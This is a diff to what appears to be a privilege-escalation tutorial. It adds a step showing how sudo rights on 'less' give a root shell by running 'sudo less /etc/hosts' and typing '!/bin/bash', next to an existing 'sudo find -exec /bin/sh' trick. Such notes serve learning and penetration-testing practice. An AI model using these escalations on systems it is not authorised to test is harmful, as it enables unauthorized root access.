@@ -12,3 +12,14 @@ In this privilege escalation technique, we search for command can use sude witho
 * **search for " find " exploit code for this bin ,and we find " sudo find . -exec /bin/sh \\ ;  -quit "**
 
 ![img](screenshots/sudo/get_root_by_sudo-l.png)
+
+
+* **search for " less " exploit code for this bin ,and we find " sudo less /etc/hosts "**
+
+![img](screenshots/sudo/sudo_less.png)
+
+* **Inside this page write " !/bin/bash "**
+
+![img](screenshots/sudo/inside_less.png)
+
+
